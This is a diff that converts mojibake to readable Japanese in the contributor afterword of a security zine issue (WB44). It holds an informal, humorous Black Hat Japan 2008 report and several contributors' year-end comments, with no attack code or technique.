+●Mail: anvil@jumperz.net
+●Comment:
+　本当はBlack Hat Japan 2008のレポートを書くつもりだったのですが、IPUロム
+がゴロゴロしていてWB44の募集が遅くなったためBHJ2008の記憶が消し飛びました。
+2ヶ月前のことは覚えてません。悪いのはすべてIPUロムです。悪いのはいつもIP
+Uロムです。FOX3!
 
-�@�Ƃ������Ƃł����ŔԊO��BHJ2008���|�[�g���ȒP�ɏ����Ă����܂��B�Ƃ�����
-�M�҂��֌W�ҁiBH�X�^�b�t��X�s�[�J�[�j�ƒm�荇���ɂȂ肷���������ŏ�����
-�悢���ƂƏ������Ⴂ���Ȃ����Ƃ̋�ʂ�t����̂����ɓ���ł��B�c�ƔY
-�ނ̂��ʓ|�������̂ňȉ��ɂ��ׂė񋓂���B
+　ということでここで番外編BHJ2008レポートを簡単に書いておきます。というか
+筆者が関係者（BHスタッフやスピーカー）と知り合いになりすぎたせいで書いて
+よいことと書いちゃいけないことの区別を付けるのが非常に難しいです。…と悩
+むのも面倒くさいので以下にすべて列挙する。
 
-�@���N�͒n���h�q�R�i�߂Ɠ���UTF7�n�J�[�A��XSS�x�����ق����Ă����B���ق̍U
-����@�͔��ɗD�납���L�Ȃ��̂ŁA�ނ͂��肪�������ƂɍU����@���ȑO��
-����ɂ��Ă���Ă���B�i�߂ƕM�҂��k�΂��Ă���ƁA�u�ŋߍ����̗L���T�C�g
-�ő��ق̎�@�ɂ��U�����ϑ�����Ă���v�Ƃ����B�M�҂́u����͂����Ɩ͕�
-�ƂłˁB�ނ͐��ʂ��R�~���j�e�B�Ƀt�B�[�h�o�b�N���Ă��܂�����v�Ɣ�����
-��{�C�œ������̂����A���̌㑍�ق��������3�l�ŉ�b���Ă���ƁA���̍U����
-���ٖ{�l�̂��̂ł��邱�Ƃ����o�����B�A�t�H���ƁB�Ƃɂ������E�̓{�N������
-�l���Ă������1024�{���炢�����Ȃ��Ǝv�킳�ꂽ�l�^�ł����B���������N��
-��l�Ƃ��X�s�iry
+　今年は地球防衛軍司令と東亜UTF7ハカー連合XSS支部総裁が来ていた。総裁の攻
+撃手法は非常に優雅かつ特有なもので、彼はありがたいことに攻撃手法を以前か
+ら公にしてくれている。司令と筆者が談笑していると、「最近国内の有名サイト
+で総裁の手法による攻撃が観測されている」という。筆者は「それはきっと模倣
+犯でつね。彼は成果をコミュニティにフィードバックしていますから」と半分以
+上本気で答えたのだが、その後総裁が加わって3人で会話していると、その攻撃は
+総裁本人のものであることが発覚した。アフォかと。とにかく世界はボクたちが
+考えているよりも1024倍くらい狭いなぁと思わされたネタでした。しかも今年は
+二人ともスピ（ry
 
-�@���N�͔��Ƀ��j�[�N�ȁA�Ƃ���l���Ɠ��������ɂ��邱�Ƃ��ł����B�ނ͖�
-�O��1�����ڂ��u�z�v�Ȃ̂ŁA�����ł̓z����i�����j�ƌĂ�ł������B�z�����
-���ƁAJavaScript�͏ȗ����āu����΂����v�Ɠǂނ炵���B���傗����������
-�����ެ�ާ����������������
-�@�܂�����ɁA��۸���ݸތ���̂ЂƂł���uC++�v�́u���[���������v�Ɠǂ�
-�炵���B���傗�������شŽ��������������������������
+　今年は非常にユニークな、とある人物と日程を共にすることができた。彼は名
+前の1文字目が「ホ」なので、ここではホさん（仮名）と呼んでおこう。ホさんに
+よると、JavaScriptは省略して「じゃばすく」と読むらしい。ちょｗｗｗｗｗｗ
+ｗｗジャヴァスクｗｗｗｗｗｗｗ
+　またさらに、プログラミング言語のひとつである「C++」は「しーたすたす」と読む
+らしい。ちょｗｗｗｗアリエナスｗｗｗｗシータスタスｗｗｗｗｗｗ
 
-�@�z���񂪕��ʂɁu����A�ӂ��ͼ������ł���v�Ƃ��^��ł����Ă���̂ŗ�
-�ɂ����ݼސ搶�Ɂu�������ׂ���ˁv�Ɗm�F����Ƃ�������^��Łu����A����
-���ł��ˁv�Ƃ�����ꂽ�B
+　ホさんが普通に「いや、ふつうはシータスタスでしょ」とか真顔でいっているので隣
+にいたケンジ先生に「シープラプラだよね」と確認するとこちらも真顔で「いや、シータス
+タスですね」とか言われた。
 
-�@BHJ��̈��݉��Ńz����Ɛ���オ�����̂��A�u�v���O���~���O���S�҂͂ǂ̌�
-�ꂩ�����ׂ����H�v�Ƃ������B����ɂ��Ă͕M�҂͎��g�̎��s�o��������
-�������_������A����́uX86�̃A�Z���u��������ׂ��v�Ƃ������̂��B������
-���̌�C����A�������AJava��Ruby�Ȃǂɏオ���Ă����΂悢�B���Ȃ݂ɃR���p�C
-���́ug++�v�́u�ް�����v�Ɠǂނ���ԈႦ�Ȃ��悤�ɁB
+　BHJ後の飲み屋でホさんと盛り上がったのが、「プログラミング初心者はどの言
+語から入るべきか？」という問題。これについては筆者は自身の失敗経験を元に
+した持論があり、それは「X86のアセンブリからやるべき」というものだ。そして
+その後C言語、シータスタス、JavaやRubyなどに上がっていけばよい。ちなみにコンパイ
+ラの「g++」は「ジータスタス」と読むから間違えないように。
 
-�@���������̓_�ɂ��ăz����Ɉȉ��̃c�b�R�~����������B�u�A�Z���u������
-����ƒ჌�C���[�G���ɂȂ��Ă��܂��A���̌�Java�Ȃǂ̏�̑w�ɍs���Ȃ��Ȃ�
-����_�����v�Ƃ������̂��B�Ȃ�قǁc����͂��邩���B�����M�҂̎���̃A�Z
-���u���[�����͒჌�C���[�G���[�Ƃ������Ă郄�c�΂���ŁAC���ꂩ���͌���
-�Ȃ��t�������Ă���B�u���������葁����肽���Ƃ��A�������Ď����p�̃c
-�[�������܂����H�v�u���[��AC�v�Ƃ�������l�������̂ł���B�Ȃ��Ȃ������[
-�����ł���B
+　しかしこの点についてホさんに以下のツッコミをもらった。「アセンブリから
+入ると低レイヤー萌えになってしまい、その後Javaなどの上の層に行けなくなる
+からダメだ」というものだ。なるほど…それはあるかも。事実筆者の周りのアセ
+ンブラーたちは低レイヤー萌えーとか言ってるヤツばかりで、C言語から上は見え
+ないフリをしている。「何か手っ取り早くやりたいとき、何つかって自分用のツ
+ール書きますか？」「うーん、C」とか答える人が多いのである。なかなか興味深
+い問題である。
 
-�@�b��͕ς���ĉ����D���j�B�ۂ݉�ł����ł����j�[�N�Ȓ��i�C�X�K�C����
-���BBHJ�̉��ŃZ�b�V�����̊Ԃ̎��Ԃɔނ�DNS Rebinding�Ȃǂ𒆐S�ɎG�k��
-�Ă���ƁA�b�肪�ς��u���{����L�̃Z�L�����e�B���Ȃǂ͂Ȃ��̂��H�v��
-�����Ă����B�^�C�~���O�悭���̃Z�b�V������hsgw���������̂Łu����hasegawa
-���ʔ����b�����邺�B����͌��������������v�Ɛ���Ɓu���႟���Ă݂�v�Ƃ�
-���ƂɁB���̌��hsgw���̃Z�b�V�����͉����D���j�ɂƂ��Ă͒m��Ȃ��l�^�΂�
-�肾�����悤�ŁA�V�����l�^���o�邽�тɐ��������ď΂��Ă����B�����D����hs
-gw����̃Z�b�V�����̓��e�ɂ��Ȃ�ݽ�߲����ꂽ�炵���A���̌��̓ۂ݉�ł�
-��l�Ō���g��Ŋ�𔭂��Ă����B�Ƃ������ƂŕM���ƹނɂ����d�����������B
-���Ȃ݂ɉ����D���́u�O����̾���݂𓯎��ʖ�Ō����̂͏��߂Ă��v�ƌ����Ă�
-���B
+　話題は変わって仮眠好き男。呑み会でも会場でもユニークな超ナイスガイだっ
+た。BHJの会場でセッションの間の時間に彼とDNS Rebindingなどを中心に雑談し
+ていると、話題が変わり「日本語特有のセキュリティ問題などはないのか？」と
+きいてきた。タイミングよく次のセッションがhsgw氏だったので「次にhasegawa
+が面白い話をするぜ。これは見た方がいいぜ」と煽ると「じゃぁ見てみる」との
+ことに。その後のhsgw氏のセッションは仮眠好き男にとっては知らないネタばか
+りだったようで、新しいネタが出るたびに声をあげて笑っていた。仮眠好きはhs
+gwさんのセッションの内容にかなりインスパイアされたらしく、その後夜の呑み会でも
+二人で肩を組んで奇声を発していた。ということで筆者ナニゲにいい仕事したかも。
+ちなみに仮眠好きは「外国語のセッションを同時通訳で見たのは初めてだ」と言ってい
+た。
 
-�@���N�ͽ�߰���Ƃ��ē�lȲ�݂����Ă����B�ł������͋��N���߰���𖱂߂���
-�ŁA���x��Ұق̂��Ƃ�������肵�Ēm�荇���ɂȂ��Ă������߁A���N�͍ĉ��
-�j������ˮˮ�Șb�Ȃǂ����Đ���オ�����B�e�N�j�J���ȓ_�ł͔ނ̃Z�b�V����
-�i���m�ɂ͐��ʂ͔ނ��܂�4�l�ɂ����̂̂悤���j����Ԗʔ��������B�ނ͌���
-�܂ł��Ȃ����i�C�X�K�C�B
+　今年はスピーカーとして二人ネイサンが来ていた。でかい方は去年もスピーカーを務めた彼
+で、何度かメールのやりとりをしたりして知り合いになっていたため、今年は再会を
+祝ったりウヒョヒョな話などをして盛り上がった。テクニカルな点では彼のセッション
+（正確には成果は彼を含む4人によるもののようだ）が一番面白かった。彼は言う
+までもなく超ナイスガイ。
 
-�@����������Ȳ�݂����i�C�X�K�C���B�ł��グ�̈��݉��ŉ��C�Ȃ��ׂɂȂ�����
-�ŁAUS�̂ǂ����炫���񂾁H�Ƃ����ƃt�����_�̃W���N�\���r�����Ƃ����B����
-�����A���������v�iLimp Bizkit�j�̏o�g�n�����I�I�I�R�ꃊ���v���D���Ȃ�
-��ˁI�Ƃ��b��������ƌ�������׳��Э��ޯ���D���Ɣ������ē{���̉��y�g�[�N
-�ɓ˓��B���܂��ɂ͓�l�Ń��^���J�̐̂̋Ȃ��̂��̂��o�����肵�Ď�܂ŐU��
-�Ă����B�m�y�m���Ă���ع݂Ɛ���オ��Ċy�����B�ނ�AV Tokyo�ɂ��Q������
-����Ă����B�u���{�̌��t���킩��΂����Ɗy�����񂾂낤�Ȃ��v�ƌ����Ă����B
+　小さい方のネイサンも超ナイスガイだ。打ち上げの飲み屋で何気なく隣になったの
+で、USのどこからきたんだ？ときくとフロリダのジャクソンビルだという。ちょ
+ｗｗ、そこリンプ（Limp Bizkit）の出身地じゃん！！！漏れリンプ超好きなんだ
+よね！とか話しかけると向こうもラウドミュージック大好きと判明して怒濤の音楽トーク
+に突入。しまいには二人でメタリカの昔の曲のリフを歌い出したりして首まで振っ
+ていた。洋楽知ってるとメリケンと盛り上がれて楽しい。彼はAV Tokyoにも参加して
+くれていた。「日本の言葉がわかればもっと楽しいんだろうなぁ」と言っていた。
 
-�@MS���痈����߰���̃u���[�X�Ƃ�AV Tokyo�̐ȂŒm�荇���ɂȂ����B���{�͏�
-�߂Ă��Ƃ����̂Łu�����Ђ��猩�Ē��������������Ɍ��������̂́H�v�Ƃ�
-���Ɓu�x�����ԂȂ̂ɃX�[�c�𒅂Ă���l�Ԃ������ς�����I�v�Ƃ����B�ނ���
-����Ǝc�Ƃ��Ēx���܂œ����Ă���̂����肦�Ȃ��炵���B�R�ꂪ�u����A���{
-�l�ɂƂ��ļ��Ă͏@���Ȃ񂾂�ˁv�Ƃ����Ɓu�{�����I�v�Ɛ^��Ŕ������ꂽ(;�L�D`)�B
-�@�ނƂ͘J�����ԂƂ����C�tܰ��X�^�C���ɂ��Ă̋c�_��������オ�����B�l��
-������Ɍ����悭�������Ƃ��ł��鎞�Ԃ͒Z������A�c�ƂȂǂ�����͉̂�Ђ�
-�Ƃ��Ă������B���������J�����Ԃ͒Z�����ׂ�����I�Ǝ咣���Ă����B�R��́u�
-�т��炻��́i���{�l�́j�ނ�̃{�X�Ɍ����Ă����v�Ɣ������Ă��������B��
-�̎����5���オ�肪�펯�炵���B�����܂������E�ł��ˁB
+　MSから来たスピーカーのブルースとはAV Tokyoの席で知り合いになった。日本は初
+めてだというので「何かチミから見て珍しく感じたり奇妙に見えたものは？」とき
+くと「遅い時間なのにスーツを着ている人間がいっぱいいる！」という。彼から
+すると残業して遅くまで働いているのがありえないらしい。漏れが「いや、日本
+人にとってシゴトは宗教なんだよね」というと「本当か！」と真顔で反応された(;´Д`)。
+　彼とは労働時間とかライフワークスタイルについての議論が超盛り上がった。人間
+が一日に効率よく働くことができる時間は短いから、残業などさせるのは会社に
+とっても損失。ぜったい労働時間は短くすべきだよ！と主張していた。漏れは「タ
+ノムからそれは（日本人の）彼らのボスに言ってくれよ」と反応しておいたｗ。彼
+の周りは5時上がりが常識らしい。うらやましい世界ですね。
 
-�@���N�͎Q���l�������N�ɔ�ׂĂ�⏭�Ȃ������C������B���N�͂܂���������
-��Ƃ悢�̂ł����c�B
-�����N��U��Ԃ��āE���N�̕���
-�@���N�̖ڕW�i�閧�j�͊��ɒB�������̂Ŗ������Ă���B���N�͏����R���s���[
-�^���Ԃ����炵�Ă��̂Ԃ�F�X�Ȃ��Ɓi�I�g�R�̎藿���Ƃ��j�Ƀ`�������W����
-�݂����Ǝv���Ă���B���Ɣ����𔃂��ăG�[�X�R���o�b�g6�����i5�͂��̊ԃN
-���A�����B����Zero�ŏォ�烌�[�U�[�~���Ă��ďĂ����ʂł͂܂��Ă���Ƃ�
-��j�B
-
-
-���͂�����悤����
-��Job: �Г��x����
-��Web: http://utf-8.jp/
-��Mail: hasegawa@utf-8.jp
-��Comment:
-�܂������e�N�j�J���Șb��łȂ����Ă��߂�Ȃ����B
-�����N�̕���
-�Ƃɂ����p��̕׋�!! 
-�p��K�{�ȃC�x���g���������ʂ����������ŁA�@�B�|����g���X�L�������͏�
-�B���܂����B�p�ꁨ���{��́AInfoseek�|�󂪂Ȃ��Ȃ������ł��B
+　今年は参加人数が去年に比べてやや少なかった気がする。来年はまた少し増え
+るとよいのですが…。
+●今年を振り返って・来年の抱負
+　今年の目標（秘密）は既に達成したので満足している。来年は少しコンピュー
+タ時間を減らしてそのぶん色々なこと（オトコの手料理とか）にチャレンジして
+みたいと思っている。あと箱○を買ってエースコンバット6をやる（5はこの間ク
+リアした。今はZeroで上からレーザー降ってきて焼かれる面ではまっているとこ
+ろ）。
 
 
-���������iRudolph von Gartheimer�j
-��Job:Der vollstreckende Vorsitzender des zentralen Exekutivkomitees
-��Web:http://www.gartheimer.com/
-��Mail:gartheimer@hotmail.com
-��Team�iGroup�j�F�@���@�l ���A��
-�����N��U��Ԃ��āE���N�̕���:
-�@���N�͊C�ɍs���Ȃ��Ďc�O�A�T�[�o�[�𗧂��グ�ē}�������������Ƃ�������
-�ł��B
-�@���N�̕����́A���x�����s�X�����i��
+■はせがわようすけ
+●Job: 社内警備員
+●Web: http://utf-8.jp/
+●Mail: hasegawa@utf-8.jp
+●Comment:
+まったくテクニカルな話題でなくってごめんなさい。
+●来年の抱負
+とにかく英語の勉強!! 
+英語必須なイベントをいくつか通じたおかげで、機械翻訳を使うスキルだけは上
+達しました。英語→日本語は、Infoseek翻訳がなかなか賢いです。
 
 
-��Kenji Aiko
-��Job: engineer
-��Web: http://ruffnex.oc.to/kenji/
-��Mail: kenji@ruffnex.oc.to
-��Comment:
-�@����͊y����ŏ������Ă��������܂���(^^;�B
-�����N��U��Ԃ��āE���N�̕���:
-�@�{���ɂ��낢�날����1�N�ł������A�U��Ԃ��Ă݂�Ɩ{���Ɋy����1�N�ł����B
-�Ƃ����Ă��A�����܂ł��u�U��Ԃ��Ă݂�Ɓv�ł����āA�����̐i�s�`�̎����I
-�ɂ́A�����Ƃ��h��������A����������������A���ɂ����������肵�Ă��킯��
-�����c�B�ł��A���������̂��܂߂āA�ǂ��v���o�ɂȂ����ƍ��͎v���܂��B����
-�l����ƁA���N���ǂ������N�ɂȂ邩�͕�����܂��񂪁A�܂�����Ȃ�ɐh����
-����A���������ɂȂ�����A���ɂ����ɂȂ����肷�銴���ł��A�܂��������Ȃ�
-�Ǝv���܂��B�����̎������猩�āA�y�������ǂ����A�Ƃ����̂�������������
-��ԑ�؂Ȃ��ƂȂ̂�������܂���B
+■理事長（Rudolph von Gartheimer）
+●Job:Der vollstreckende Vorsitzender des zentralen Exekutivkomitees
+●Web:http://www.gartheimer.com/
+●Mail:gartheimer@hotmail.com
+●Team（Group）：宗凶法人 愛連合
+●今年を振り返って・来年の抱負:
+　今年は海に行けなくて残念、サーバーを立ち上げて党員が増えたことが嬉しい
+です。
+　来年の抱負は、今度こそ市街制服（ぁ
 
 
-��IPUSIRON
-��Job: �v���O���}�[
-��Web: http://akademeia.info
-��Mail: ipusiron@gmail.com
-��Comment:
-�@WB44�̃����[�X���x��Ă��܂����ҁE�ǎ҂̊F�l�ɂ����f�����������܂����B
-�\���󂠂�܂���ł����B
-�@WB���n�܂��Ă���5�N���o���܂��B�ŏ��̍���Phrack�ɒǂ����̂͂܂��܂�
-�悾�Ǝv���Ă��܂������A�������낻��˒��͈͂ɓ����Ă����Ǝv���Ă��܂��B
-��2�N�{���Œǂ��������ł��ˁB
-�@�V�K�̎��M�҂͐�����W���Ă��܂��̂ŁA�����Ă����傭�������B���S�Ȍ��e
-���ł��Ȃ��A�����������ǉ�����������悢�̂��킩��Ȃ��ȂǁA�Y��ł��܂�
-���瑊�k�ɏ��܂��̂ŁA�C�y�Ƀ��[�����������B�X�������肢���܂��B
-�����N��U��Ԃ��āE���N�̕���:
-�@����܂ł͂Ƃ肠�����R�[�h�������Ă݂ăf�o�b�O���̃G���[�őΉ����悤��
-�����A�v���[�`�����邱�Ƃ����X����܂������A���ꂩ��͐���ɓ��삷�邱��
-���m�M����悤�ȃR�[�h���ŏ����珑���悤�ɐS���������ł��B
-�@���N�͐��w�����ڂ��Ă����̂ŁA���N�͐��w�����������׋����悤�Ǝv���܂��B
+■Kenji Aiko
+●Job: engineer
+●Web: http://ruffnex.oc.to/kenji/
+●Mail: kenji@ruffnex.oc.to
+●Comment:
+　今回は楽しんで書かせていただきました(^^;。
+●今年を振り返って・来年の抱負:
+　本当にいろいろあった1年でしたが、振り返ってみると本当に楽しい1年でした。
+といっても、あくまでも「振り返ってみると」であって、当時の進行形の自分的
+には、そうとう辛かったり、泣きそうだったり、死にそうだったりしてたわけで
+すが…。でも、そういうのも含めて、良い思い出になったと今は思います。そう
+考えると、来年がどういう年になるかは分かりませんが、まぁそれなりに辛かっ
+たり、泣きそうになったり、死にそうになったりする感じでも、まぁいいかなぁ
+と思います。未来の自分から見て、楽しいかどうか、というのが何かをする上で
+一番大切なことなのかもしれません。
+
+
+■IPUSIRON
+●Job: プログラマー
+●Web: http://akademeia.info
+●Mail: ipusiron@gmail.com
+●Comment:
+　WB44のリリースが遅れてしまい著者・読者の皆様にご迷惑をおかけしました。
+申し訳ありませんでした。
+　WBが始まってもう5年も経ちます。最初の頃はPhrackに追いつくのはまだまだ
+先だと思っていましたが、もうそろそろ射程範囲に入ってきたと思っています。
+後2年＋αで追いつきそうですね。
+　新規の執筆者は随時募集していますので、奮ってご応募ください。完全な原稿
+ができない、書きたいけど何を書いたらよいのかわからないなど、悩んでいまし
+たら相談に乗りますので、気軽にメールください。宜しくお願いします。
+●今年を振り返って・来年の抱負:
+　これまではとりあえずコードを書いてみてデバッグ時のエラーで対応しようと
+いうアプローチをすることが多々ありましたが、これからは正常に動作すること
+を確信するようなコードを最初から書くように心がけたいです。
+　今年は数学をさぼってきたので、来年は数学をもう少し勉強しようと思います。
 
 
